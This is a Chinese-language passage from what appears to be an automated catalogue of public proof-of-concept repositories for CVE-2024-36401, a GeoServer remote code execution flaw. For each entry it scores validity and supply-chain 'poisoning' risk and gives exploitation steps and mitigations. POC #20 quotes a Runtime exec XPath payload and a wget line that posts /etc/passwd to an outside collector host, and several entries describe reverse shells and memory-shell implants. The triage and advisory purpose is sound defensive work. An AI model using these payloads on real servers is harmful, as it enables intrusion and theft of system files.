*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

